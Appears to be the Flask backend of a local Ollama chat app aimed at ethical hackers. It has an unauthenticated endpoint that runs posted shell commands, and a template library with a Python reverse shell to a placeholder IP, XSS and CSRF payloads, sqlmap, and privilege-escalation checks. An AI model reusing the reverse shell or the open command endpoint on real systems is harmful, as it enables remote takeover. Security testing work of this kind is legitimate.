#!/usr/bin/env python3
"""
Pegasus Tak Terbatas
---------------------------
Designed and maintained by dr. Sobri.
Author: Lettu Kes dr. Muhammad Sobri Maulana, S.Kom, CEH, OSCP, OSCE
GitHub: github.com/sobri3195
Email: muhammadsobrimaulana31@gmail.com
"""

import warnings
warnings.filterwarnings("ignore")
import sys
sys.modules['warnings'] = warnings

import subprocess, json, re, os, sqlite3, hashlib, uuid, secrets, requests
from waitress import serve
from flask import Flask, request, jsonify, render_template, Response, stream_with_context, make_response, send_from_directory
from werkzeug.utils import secure_filename
from datetime import datetime
import shutil

# ASCII Art Banner - pegasus_tak_terbatas by dr. Sobri
PEGASUS_ASCII_ART = """
╔═══════════════════════════════════════════════════════════════════════════════╗
║                                                                               ║
║   ██████╗ ███████╗ ██████╗  █████╗ ███████╗██╗   ██╗███████╗                ║
║   ██╔══██╗██╔════╝██╔════╝ ██╔══██╗██╔════╝██║   ██║██╔════╝                ║
║   ██████╔╝█████╗  ██║  ███╗███████║███████╗██║   ██║███████╗                ║
║   ██╔═══╝ ██╔══╝  ██║   ██║██╔══██║╚════██║██║   ██║╚════██║                ║
║   ██║     ███████╗╚██████╔╝██║  ██║███████║╚██████╔╝███████║                ║
║   ╚═╝     ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚══════╝                ║
║                                                                               ║
║       ████████╗ █████╗ ██╗  ██╗    ████████╗███████╗██████╗ ██████╗         ║
║       ╚══██╔══╝██╔══██╗██║ ██╔╝    ╚══██╔══╝██╔════╝██╔══██╗██╔══██╗        ║
║          ██║   ███████║█████╔╝        ██║   █████╗  ██████╔╝██████╔╝        ║
║          ██║   ██╔══██║██╔═██╗        ██║   ██╔══╝  ██╔══██╗██╔══██╗        ║
║          ██║   ██║  ██║██║  ██╗       ██║   ███████╗██║  ██║██████╔╝        ║
║          ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝       ╚═╝   ╚══════╝╚═╝  ╚═╝╚═════╝         ║
║                                                                               ║
║              ██████╗  █████╗ ████████╗ █████╗ ███████╗                       ║
║              ██╔══██╗██╔══██╗╚══██╔══╝██╔══██╗██╔════╝                       ║
║              ██████╔╝███████║   ██║   ███████║███████╗                       ║
║              ██╔══██╗██╔══██║   ██║   ██╔══██║╚════██║                       ║
║              ██████╔╝██║  ██║   ██║   ██║  ██║███████║                       ║
║              ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚══════╝                       ║
║                                                                               ║
║                   🦅 Pegasus Tak Terbatas AI System 🦅                       ║
║                                                                               ║
║         Designed & Developed by dr. Sobri (Muhammad Sobri Maulana)          ║
║              CEH | OSCP | OSCE | S.Kom | Cybersecurity Expert               ║
║                                                                               ║
║                    GitHub: github.com/sobri3195                              ║
║              Email: muhammadsobrimaulana31@gmail.com                         ║
║                                                                               ║
║             Built for Ethical Hackers. Powered by Intelligence.              ║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝
""" 

try:
    from updater import update_pegasus_tak_terbatas
    update_pegasus_tak_terbatas()
except Exception as e:
    print(f"[Update Check Failed] {e}")


pegasus_tak_terbatas = Flask(__name__)
DB_NAME = 'chat_database.db'
UPLOAD_FOLDER = 'uploads' 
pegasus_tak_terbatas.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER

def init_db():
    os.makedirs(UPLOAD_FOLDER, exist_ok=True)
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("PRAGMA foreign_keys = ON;")
    
    c.execute('''
        CREATE TABLE IF NOT EXISTS users (
            user_hash TEXT PRIMARY KEY,
            username TEXT NOT NULL
        )
    ''')
    
    c.execute('''
        CREATE TABLE IF NOT EXISTS projects (
            project_id TEXT PRIMARY KEY,
            user_hash TEXT NOT NULL,
            title TEXT NOT NULL,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY(user_hash) REFERENCES users(user_hash) ON DELETE CASCADE
        )
    ''')
    
    c.execute('''
        CREATE TABLE IF NOT EXISTS chats (
            chat_id TEXT PRIMARY KEY,
            user_hash TEXT NOT NULL,
            title TEXT NOT NULL,
            model_name TEXT NOT NULL,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
            project_id TEXT,
            FOREIGN KEY(user_hash) REFERENCES users(user_hash) ON DELETE CASCADE,
            FOREIGN KEY(project_id) REFERENCES projects(project_id) ON DELETE CASCADE
        )
    ''')
    c.execute('''
        CREATE TABLE IF NOT EXISTS messages (
            message_id INTEGER PRIMARY KEY AUTOINCREMENT,
            chat_id TEXT NOT NULL,
            sender TEXT NOT NULL,
            text TEXT NOT NULL,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
            file_path TEXT,
            file_name TEXT,
            FOREIGN KEY(chat_id) REFERENCES chats(chat_id) ON DELETE CASCADE
        )
    ''')
    
    c.execute('''
        CREATE TABLE IF NOT EXISTS command_outputs (
            output_id TEXT PRIMARY KEY,
            chat_id TEXT NOT NULL,
            command TEXT NOT NULL,
            output TEXT NOT NULL,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY(chat_id) REFERENCES chats(chat_id) ON DELETE CASCADE
        )
    ''')

    try:
        c.execute("ALTER TABLE chats ADD COLUMN model_name TEXT NOT NULL DEFAULT 'llama3'")
    except sqlite3.OperationalError:
        pass
        
    try:
        c.execute("ALTER TABLE messages ADD COLUMN file_path TEXT")
        c.execute("ALTER TABLE messages ADD COLUMN file_name TEXT")
    except sqlite3.OperationalError:
        pass 
        
    try:
        c.execute("ALTER TABLE chats ADD COLUMN project_id TEXT REFERENCES projects(project_id) ON DELETE CASCADE")
    except sqlite3.OperationalError:
        pass 

    conn.commit()
    conn.close()


def get_chat_history_for_ollama(chat_id):
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("SELECT sender, text, file_name FROM messages WHERE chat_id = ? ORDER BY timestamp ASC", (chat_id,))
    history = []
    for row in c.fetchall():
        sender, text, file_name = row
        role = 'user' if sender == 'user' else 'assistant'
        content = text
        if file_name:
            content = f"(The user has attached a file: {file_name})\n\n{text}"
        history.append({'role': role, 'content': content})
    conn.close()
    return history

def stream_ollama_response(model_name, history, new_message, chat_id):
    ollama_url = "http://localhost:11434/api/chat"
    
    messages = history 
    
    payload = {
        "model": model_name,
        "messages": messages,
        "stream": True
    }
    
    ai_full_response = ""
    try:
        with requests.post(ollama_url, json=payload, stream=True) as r:
            r.raise_for_status()
            for line in r.iter_lines():
                if line:
                    data = json.loads(line.decode("utf-8"))
                    if "content" in data["message"]:
                        ai_full_response += data["message"]["content"]
                        yield data["message"]["content"]
                    if data.get("done"):
                        break
    except Exception as e:
        yield f"[Error: {e}]"
    finally:
        if ai_full_response:
            conn = sqlite3.connect(DB_NAME)
            c = conn.cursor()
            c.execute("INSERT INTO messages (chat_id, sender, text) VALUES (?, ?, ?)", (chat_id, 'ai', ai_full_response))
            conn.commit()
            conn.close()

@pegasus_tak_terbatas.route('/upload_file', methods=['POST'])
def upload_file():
    if 'file' not in request.files:
        return jsonify({"success": False, "message": "No file part"}), 400
    
    file = request.files['file']
    chat_id = request.form.get('chat_id')

    if file.filename == '':
        return jsonify({"success": False, "message": "No selected file"}), 400
    
    if not chat_id:
        return jsonify({"success": False, "message": "No chat ID"}), 400

    if file:
        filename = secure_filename(file.filename)
        chat_upload_dir = os.path.join(pegasus_tak_terbatas.config['UPLOAD_FOLDER'], chat_id)
        os.makedirs(chat_upload_dir, exist_ok=True)
        
        file_path = os.path.join(chat_upload_dir, filename)
        file.save(file_path)
        
        web_path = f"/uploads/{chat_id}/{filename}"
        return jsonify({"success": True, "file_path": web_path, "file_name": filename})

@pegasus_tak_terbatas.route('/uploads/<chat_id>/<path:filename>')
def uploaded_file(chat_id, filename):
    chat_upload_dir = os.path.join(pegasus_tak_terbatas.config['UPLOAD_FOLDER'], chat_id)
    return send_from_directory(chat_upload_dir, filename)


@pegasus_tak_terbatas.route('/execute_stream', methods=['POST'])
def execute_stream():
    command = request.json.get("command")
    chat_id = request.json.get("chat_id")
    output_id = request.json.get("output_id")

    if not all([command, chat_id, output_id]):
        return jsonify({"success": False, "message": "Missing required data."}), 400

    full_output = ""
    
    def generate_and_save():
        nonlocal full_output
        try:
            process = subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1
            )
            
            for line in iter(process.stdout.readline, ''):
                full_output += line
                yield line
                
            process.stdout.close()
            return_code = process.wait()
            final_status = f"\n[Process finished with exit code {return_code}]\n" if return_code != 0 else f"\n[Process finished successfully]\n"
            full_output += final_status
            yield final_status

        except FileNotFoundError:
            full_output = "[Error: Command not found. Please check your command and environment path.]"
            yield full_output
        except Exception as e:
            full_output = f"[Error: {str(e)}]"
            yield full_output
        finally:
            conn = sqlite3.connect(DB_NAME)
            c = conn.cursor()
            c.execute("INSERT OR REPLACE INTO command_outputs (output_id, chat_id, command, output) VALUES (?, ?, ?, ?)",
                      (output_id, chat_id, command, full_output))
            conn.commit()
            conn.close()

    return Response(stream_with_context(generate_and_save()), mimetype="text/plain")

@pegasus_tak_terbatas.route('/get_command_output', methods=['POST'])
def get_command_output():
    output_id = request.json.get("output_id")
    if not output_id:
        return jsonify({"success": False, "message": "Output ID not provided."}), 400

    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("SELECT command, output FROM command_outputs WHERE output_id = ?", (output_id,))
    result = c.fetchone()
    conn.close()

    if result:
        return jsonify({"success": True, "command": result[0], "output": result[1]})
    else:
        return jsonify({"success": False, "message": "Output not found."}), 404

@pegasus_tak_terbatas.route('/')
def index():
    return render_template('index.html', page_mode='chats', active_project_id=None, active_project_title=None)

@pegasus_tak_terbatas.route('/projects')
def projects_page():
    return render_template('index.html', page_mode='projects', active_project_id=None, active_project_title=None)

@pegasus_tak_terbatas.route('/project/<project_id>')
def project_detail_page(project_id):
    user_hash = request.cookies.get('user_hash')
    project_title = "Project" 
    
    if user_hash:
        try:
            conn = sqlite3.connect(DB_NAME)
            c = conn.cursor()
            c.execute("SELECT title FROM projects WHERE project_id = ? AND user_hash = ?", (project_id, user_hash))
            project = c.fetchone()
            conn.close()
            if project:
                project_title = project[0]
            else:
                project_title = "Unknown Project"
        except Exception as e:
            print(f"Error fetching project title: {e}")
            project_title = "Error"

    return render_template('index.html', page_mode='project_detail', active_project_id=project_id, active_project_title=project_title)

@pegasus_tak_terbatas.route('/login', methods=['POST'])
def login():
    username = request.json.get("username")
    if not username:
        return jsonify({"success": False, "message": "Username not provided."}), 400
    
    user_hash = hashlib.sha256(secrets.token_bytes(32)).hexdigest()

    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("SELECT user_hash FROM users WHERE username = ?", (username,))
    existing_user = c.fetchone()
    if existing_user:
        user_hash = existing_user[0]
    else:
        c.execute("INSERT INTO users (user_hash, username) VALUES (?, ?)", (user_hash, username))
        conn.commit()
    conn.close()

    response = make_response(jsonify({"success": True, "user_hash": user_hash, "username": username}))
    response.set_cookie('user_hash', user_hash, max_age=60*60*24*365) 
    return response

@pegasus_tak_terbatas.route('/get_user_info', methods=['GET'])
def get_user_info():
    user_hash = request.cookies.get('user_hash')
    if not user_hash:
        return jsonify({"success": False, "message": "User hash not found."}), 401

    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("SELECT username FROM users WHERE user_hash = ?", (user_hash,))
    user_info = c.fetchone()
    conn.close()

    if user_info:
        return jsonify({"success": True, "username": user_info[0]})
    else:
        return jsonify({"success": False, "message": "User not found."}), 404


@pegasus_tak_terbatas.route('/get_chats', methods=['GET'])
def get_chats():
    user_hash = request.cookies.get('user_hash')
    if not user_hash:
        return jsonify({"success": False, "message": "User hash not found."}), 401
    
    project_id = request.args.get('project_id')

    if not project_id or project_id == 'null' or project_id == 'None':
        project_id = None

    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    
    if project_id: 
        c.execute(
            "SELECT chat_id, title, model_name FROM chats WHERE user_hash = ? AND project_id = ? ORDER BY timestamp DESC", 
            (user_hash, project_id)
        )
    else:
         c.execute(
            "SELECT chat_id, title, model_name FROM chats WHERE user_hash = ? AND (project_id IS NULL OR project_id = 'None') ORDER BY timestamp DESC", 
            (user_hash,)
        )
        
    chat_list = [{"chat_id": row[0], "title": row[1], "model_name": row[2]} for row in c.fetchall()]
    conn.close()
    return jsonify({"success": True, "chats": chat_list})

@pegasus_tak_terbatas.route('/get_chat_messages', methods=['POST'])
def get_chat_messages():
    chat_id = request.json.get("chat_id")
    if not chat_id:
        return jsonify({"success": False, "message": "Chat ID not provided."}), 400

    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("SELECT sender, text, file_path, file_name FROM messages WHERE chat_id = ? ORDER BY timestamp ASC", (chat_id,))
    messages = [{"sender": row[0], "text": row[1], "file_path": row[2], "file_name": row[3]} for row in c.fetchall()]
    conn.close()
    return jsonify({"success": True, "messages": messages})

@pegasus_tak_terbatas.route('/rename_chat', methods=['POST'])
def rename_chat():
    chat_id = request.json.get("chat_id")
    new_title = request.json.get("new_title")
    user_hash = request.cookies.get('user_hash')

    if not all([chat_id, new_title, user_hash]):
        return jsonify({"success": False, "message": "Missing required data."}), 400
    
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("UPDATE chats SET title = ? WHERE chat_id = ? AND user_hash = ?", (new_title, chat_id, user_hash))
    conn.commit()
    conn.close()
    return jsonify({"success": True})

@pegasus_tak_terbatas.route('/delete_chat', methods=['POST'])
def delete_chat():
    chat_id = request.json.get("chat_id")
    user_hash = request.cookies.get('user_hash')
    
    if not all([chat_id, user_hash]):
        return jsonify({"success": False, "message": "Missing required data."}), 400

    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("DELETE FROM chats WHERE chat_id = ? AND user_hash = ?", (chat_id, user_hash))
    conn.commit()
    conn.close()
    return jsonify({"success": True})
    
@pegasus_tak_terbatas.route('/create_new_chat', methods=['POST'])
def create_new_chat():
    user_hash = request.cookies.get('user_hash')
    model_name = request.json.get("model_name")
    project_id = request.json.get("project_id") 

    if not user_hash or not model_name:
        return jsonify({"success": False, "message": "Missing user hash or model name."}), 400

    if not project_id or project_id == 'null' or project_id == 'None':
        project_id = None

    chat_id = str(uuid.uuid4())
    default_title = "New Chat"
    
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute(
        "INSERT INTO chats (chat_id, user_hash, title, model_name, project_id) VALUES (?, ?, ?, ?, ?)", 
        (chat_id, user_hash, default_title, model_name, project_id)
    )
    conn.commit()
    conn.close()

    return jsonify({"success": True, "chat_id": chat_id, "title": default_title, "model_name": model_name})

@pegasus_tak_terbatas.route('/chat_stream', methods=['POST'])
def chat_stream():
    user_message = request.json.get("message")
    chat_id = request.json.get("chat_id")
    model_name = request.json.get("model_name")
    user_hash = request.cookies.get('user_hash')
    file_path = request.json.get("file_path")
    file_name = request.json.get("file_name")

    if not all([user_message, chat_id, model_name, user_hash]):
        return jsonify({"response": "Missing chat data."}), 400

    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()

    c.execute("SELECT * FROM messages WHERE chat_id = ?", (chat_id,))
    is_first_message = not c.fetchone()
    if is_first_message:
        chat_title = user_message[:25] + "..." if len(user_message) > 25 else user_message
        c.execute("UPDATE chats SET title = ? WHERE chat_id = ?", (chat_title, chat_id))
        conn.commit()

    c.execute("INSERT INTO messages (chat_id, sender, text, file_path, file_name) VALUES (?, ?, ?, ?, ?)", 
              (chat_id, 'user', user_message, file_path, file_name))
    conn.commit()
    conn.close()

    history = get_chat_history_for_ollama(chat_id)
    
    return Response(stream_with_context(stream_ollama_response(model_name, history, user_message, chat_id)),
                    mimetype="text/plain")

@pegasus_tak_terbatas.route('/get_models', methods=['GET'])
def get_models():
    ollama_url = "http://localhost:11434/api/tags"
    try:
        r = requests.get(ollama_url)
        r.raise_for_status()
        models_data = r.json()
        models = []
        for model in models_data.get('models', []):
            model_name = model['name']
            if "drana" in model_name or "pegasus" in model_name:
                models.append(model_name)
        return jsonify({"success": True, "models": models})
    except requests.exceptions.RequestException as e:
        return jsonify({"success": False, "message": f"Error fetching models: {e}"}), 500

@pegasus_tak_terbatas.route('/get_projects', methods=['GET'])
def get_projects():
    user_hash = request.cookies.get('user_hash')
    if not user_hash:
        return jsonify({"success": False, "message": "User hash not found."}), 401
    
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("SELECT project_id, title FROM projects WHERE user_hash = ? ORDER BY timestamp DESC", (user_hash,))
    project_list = [{"project_id": row[0], "title": row[1]} for row in c.fetchall()]
    conn.close()
    return jsonify({"success": True, "projects": project_list})

@pegasus_tak_terbatas.route('/create_new_project', methods=['POST'])
def create_new_project():
    user_hash = request.cookies.get('user_hash')
    project_name = request.json.get("project_name")

    if not user_hash or not project_name:
        return jsonify({"success": False, "message": "Missing user hash or project name."}), 400

    project_id = str(uuid.uuid4())
    
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute(
        "INSERT INTO projects (project_id, user_hash, title) VALUES (?, ?, ?)", 
        (project_id, user_hash, project_name)
    )
    conn.commit()
    conn.close()

    return jsonify({"success": True, "project_id": project_id, "title": project_name})

@pegasus_tak_terbatas.route('/rename_project', methods=['POST'])
def rename_project():
    project_id = request.json.get("project_id")
    new_title = request.json.get("new_title")
    user_hash = request.cookies.get('user_hash')

    if not all([project_id, new_title, user_hash]):
        return jsonify({"success": False, "message": "Missing required data."}), 400
    
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("UPDATE projects SET title = ? WHERE project_id = ? AND user_hash = ?", (new_title, project_id, user_hash))
    conn.commit()
    conn.close()
    return jsonify({"success": True})

@pegasus_tak_terbatas.route('/delete_project', methods=['POST'])
def delete_project():
    project_id = request.json.get("project_id")
    user_hash = request.cookies.get('user_hash')
    
    if not all([project_id, user_hash]):
        return jsonify({"success": False, "message": "Missing required data."}), 400

    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("DELETE FROM projects WHERE project_id = ? AND user_hash = ?", (project_id, user_hash))
    conn.commit()
    conn.close()
    return jsonify({"success": True})

# NEW FEATURE 1: Export Chat History
@pegasus_tak_terbatas.route('/export_chat', methods=['POST'])
def export_chat():
    chat_id = request.json.get("chat_id")
    export_format = request.json.get("format", "json")
    user_hash = request.cookies.get('user_hash')
    
    if not all([chat_id, user_hash]):
        return jsonify({"success": False, "message": "Missing required data."}), 400

    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    
    c.execute("SELECT title, model_name FROM chats WHERE chat_id = ? AND user_hash = ?", (chat_id, user_hash))
    chat_info = c.fetchone()
    
    if not chat_info:
        conn.close()
        return jsonify({"success": False, "message": "Chat not found."}), 404
    
    c.execute("SELECT sender, text, timestamp FROM messages WHERE chat_id = ? ORDER BY timestamp ASC", (chat_id,))
    messages = [{"sender": row[0], "text": row[1], "timestamp": row[2]} for row in c.fetchall()]
    conn.close()

    if export_format == "json":
        export_data = {
            "title": chat_info[0],
            "model": chat_info[1],
            "exported_at": datetime.now().isoformat(),
            "exported_by": "dr. Sobri - Pegasus Tak Terbatas",
            "messages": messages
        }
        return jsonify({"success": True, "data": export_data, "filename": f"chat_{chat_id}.json"})
    
    elif export_format == "txt":
        txt_content = f"Pegasus Tak Terbatas - Chat Export\n"
        txt_content += f"Created by: dr. Sobri (Muhammad Sobri Maulana)\n"
        txt_content += f"=" * 80 + "\n\n"
        txt_content += f"Chat Title: {chat_info[0]}\n"
        txt_content += f"Model: {chat_info[1]}\n"
        txt_content += f"Exported: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        txt_content += f"=" * 80 + "\n\n"
        
        for msg in messages:
            txt_content += f"[{msg['timestamp']}] {msg['sender'].upper()}:\n"
            txt_content += f"{msg['text']}\n\n"
        
        return jsonify({"success": True, "data": txt_content, "filename": f"chat_{chat_id}.txt"})
    
    return jsonify({"success": False, "message": "Invalid format."}), 400

# NEW FEATURE 2: Search in Chat Messages
@pegasus_tak_terbatas.route('/search_messages', methods=['POST'])
def search_messages():
    search_query = request.json.get("query")
    chat_id = request.json.get("chat_id")
    user_hash = request.cookies.get('user_hash')
    
    if not all([search_query, user_hash]):
        return jsonify({"success": False, "message": "Missing required data."}), 400

    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    
    if chat_id:
        c.execute("""
            SELECT m.message_id, m.chat_id, m.sender, m.text, m.timestamp, ch.title 
            FROM messages m 
            JOIN chats ch ON m.chat_id = ch.chat_id 
            WHERE ch.user_hash = ? AND m.chat_id = ? AND m.text LIKE ?
            ORDER BY m.timestamp DESC
        """, (user_hash, chat_id, f"%{search_query}%"))
    else:
        c.execute("""
            SELECT m.message_id, m.chat_id, m.sender, m.text, m.timestamp, ch.title 
            FROM messages m 
            JOIN chats ch ON m.chat_id = ch.chat_id 
            WHERE ch.user_hash = ? AND m.text LIKE ?
            ORDER BY m.timestamp DESC
            LIMIT 50
        """, (user_hash, f"%{search_query}%"))
    
    results = [{
        "message_id": row[0],
        "chat_id": row[1],
        "sender": row[2],
        "text": row[3],
        "timestamp": row[4],
        "chat_title": row[5]
    } for row in c.fetchall()]
    
    conn.close()
    return jsonify({"success": True, "results": results, "count": len(results)})

# NEW FEATURE 3: Chat Statistics Dashboard
@pegasus_tak_terbatas.route('/get_statistics', methods=['GET'])
def get_statistics():
    user_hash = request.cookies.get('user_hash')
    
    if not user_hash:
        return jsonify({"success": False, "message": "User hash not found."}), 401

    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    
    c.execute("SELECT COUNT(*) FROM chats WHERE user_hash = ?", (user_hash,))
    total_chats = c.fetchone()[0]
    
    c.execute("SELECT COUNT(*) FROM messages m JOIN chats c ON m.chat_id = c.chat_id WHERE c.user_hash = ?", (user_hash,))
    total_messages = c.fetchone()[0]
    
    c.execute("SELECT COUNT(*) FROM projects WHERE user_hash = ?", (user_hash,))
    total_projects = c.fetchone()[0]
    
    c.execute("""
        SELECT model_name, COUNT(*) as count 
        FROM chats 
        WHERE user_hash = ? 
        GROUP BY model_name 
        ORDER BY count DESC
    """, (user_hash,))
    model_usage = [{"model": row[0], "count": row[1]} for row in c.fetchall()]
    
    c.execute("""
        SELECT DATE(timestamp) as date, COUNT(*) as count 
        FROM messages m 
        JOIN chats c ON m.chat_id = c.chat_id 
        WHERE c.user_hash = ? 
        GROUP BY DATE(timestamp) 
        ORDER BY date DESC 
        LIMIT 7
    """, (user_hash,))
    daily_activity = [{"date": row[0], "count": row[1]} for row in c.fetchall()]
    
    conn.close()
    
    stats = {
        "total_chats": total_chats,
        "total_messages": total_messages,
        "total_projects": total_projects,
        "model_usage": model_usage,
        "daily_activity": daily_activity,
        "generated_by": "dr. Sobri - Pegasus Tak Terbatas"
    }
    
    return jsonify({"success": True, "statistics": stats})

# NEW FEATURE 4: Backup and Restore Database
@pegasus_tak_terbatas.route('/backup_database', methods=['POST'])
def backup_database():
    user_hash = request.cookies.get('user_hash')
    
    if not user_hash:
        return jsonify({"success": False, "message": "User hash not found."}), 401

    backup_dir = 'backups'
    os.makedirs(backup_dir, exist_ok=True)
    
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    backup_filename = f"pegasus_backup_{timestamp}.db"
    backup_path = os.path.join(backup_dir, backup_filename)
    
    try:
        shutil.copy2(DB_NAME, backup_path)
        return jsonify({
            "success": True, 
            "message": "Database backed up successfully!",
            "filename": backup_filename,
            "path": backup_path,
            "timestamp": timestamp,
            "created_by": "dr. Sobri - Pegasus Tak Terbatas"
        })
    except Exception as e:
        return jsonify({"success": False, "message": f"Backup failed: {str(e)}"}), 500

@pegasus_tak_terbatas.route('/list_backups', methods=['GET'])
def list_backups():
    user_hash = request.cookies.get('user_hash')
    
    if not user_hash:
        return jsonify({"success": False, "message": "User hash not found."}), 401

    backup_dir = 'backups'
    if not os.path.exists(backup_dir):
        return jsonify({"success": True, "backups": []})
    
    backups = []
    for filename in os.listdir(backup_dir):
        if filename.endswith('.db'):
            filepath = os.path.join(backup_dir, filename)
            stat = os.stat(filepath)
            backups.append({
                "filename": filename,
                "size": stat.st_size,
                "created": datetime.fromtimestamp(stat.st_mtime).isoformat()
            })
    
    backups.sort(key=lambda x: x['created'], reverse=True)
    return jsonify({"success": True, "backups": backups})

# NEW FEATURE 5: Code Templates/Snippets Library
@pegasus_tak_terbatas.route('/get_templates', methods=['GET'])
def get_templates():
    templates = {
        "cybersecurity": [
            {
                "name": "Port Scan",
                "description": "Basic nmap port scanning",
                "code": "nmap -sV -sC -p- -oN scan_results.txt [target_ip]",
                "category": "reconnaissance"
            },
            {
                "name": "Web Enumeration",
                "description": "Directory bruteforce with gobuster",
                "code": "gobuster dir -u http://[target] -w /usr/share/wordlists/dirb/common.txt -x php,html,txt",
                "category": "enumeration"
            },
            {
                "name": "SQL Injection Test",
                "description": "Basic SQLi detection",
                "code": "sqlmap -u 'http://[target]/page.php?id=1' --batch --dbs",
                "category": "exploitation"
            },
            {
                "name": "Reverse Shell",
                "description": "Python reverse shell",
                "code": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"[IP]\",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'",
                "category": "post-exploitation"
            },
            {
                "name": "Privilege Escalation Check",
                "description": "Linux privilege escalation enumeration",
                "code": "find / -perm -u=s -type f 2>/dev/null\nsudo -l\ncrontab -l",
                "category": "privilege-escalation"
            }
        ],
        "python": [
            {
                "name": "HTTP Request",
                "description": "Make HTTP GET request",
                "code": "import requests\nresponse = requests.get('https://api.example.com')\nprint(response.json())",
                "category": "networking"
            },
            {
                "name": "File Operations",
                "description": "Read and write files",
                "code": "with open('file.txt', 'r') as f:\n    content = f.read()\n\nwith open('output.txt', 'w') as f:\n    f.write(content)",
                "category": "file-handling"
            }
        ],
        "web": [
            {
                "name": "XSS Test Payload",
                "description": "Basic XSS detection",
                "code": "<script>alert('XSS by dr.Sobri')</script>",
                "category": "testing"
            },
            {
                "name": "CSRF POC",
                "description": "CSRF proof of concept",
                "code": "<form action='https://target.com/action' method='POST'>\n  <input type='hidden' name='param' value='value'>\n  <input type='submit' value='Submit'>\n</form>\n<script>document.forms[0].submit();</script>",
                "category": "testing"
            }
        ]
    }
    
    return jsonify({
        "success": True, 
        "templates": templates,
        "created_by": "dr. Sobri - Pegasus Tak Terbatas",
        "total_categories": len(templates),
        "total_templates": sum(len(v) for v in templates.values())
    })

@pegasus_tak_terbatas.route('/add_custom_template', methods=['POST'])
def add_custom_template():
    user_hash = request.cookies.get('user_hash')
    name = request.json.get("name")
    code = request.json.get("code")
    description = request.json.get("description", "")
    category = request.json.get("category", "custom")
    
    if not all([user_hash, name, code]):
        return jsonify({"success": False, "message": "Missing required data."}), 400

    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    
    try:
        c.execute('''
            CREATE TABLE IF NOT EXISTS custom_templates (
                template_id TEXT PRIMARY KEY,
                user_hash TEXT NOT NULL,
                name TEXT NOT NULL,
                code TEXT NOT NULL,
                description TEXT,
                category TEXT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY(user_hash) REFERENCES users(user_hash) ON DELETE CASCADE
            )
        ''')
    except sqlite3.OperationalError:
        pass
    
    template_id = str(uuid.uuid4())
    c.execute(
        "INSERT INTO custom_templates (template_id, user_hash, name, code, description, category) VALUES (?, ?, ?, ?, ?, ?)",
        (template_id, user_hash, name, code, description, category)
    )
    conn.commit()
    conn.close()
    
    return jsonify({"success": True, "template_id": template_id})

@pegasus_tak_terbatas.route('/get_custom_templates', methods=['GET'])
def get_custom_templates():
    user_hash = request.cookies.get('user_hash')
    
    if not user_hash:
        return jsonify({"success": False, "message": "User hash not found."}), 401

    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("""
        SELECT template_id, name, code, description, category, timestamp 
        FROM custom_templates 
        WHERE user_hash = ? 
        ORDER BY timestamp DESC
    """, (user_hash,))
    
    templates = [{
        "template_id": row[0],
        "name": row[1],
        "code": row[2],
        "description": row[3],
        "category": row[4],
        "timestamp": row[5]
    } for row in c.fetchall()]
    
    conn.close()
    return jsonify({"success": True, "templates": templates})

if __name__ == '__main__':
    print(PEGASUS_ASCII_ART)
    try:
        init_db()
    except sqlite3.OperationalError:
        print("Database already initialized.")
    
    print("\n🚀 Pegasus Tak Terbatas server is running on ::: http://127.0.0.1:80")
    print("📅 Started at:", datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
    print("👨‍💻 Developed by: dr. Sobri (Muhammad Sobri Maulana)")
    print("=" * 80)
    serve(pegasus_tak_terbatas, host='127.0.0.1', port=80)
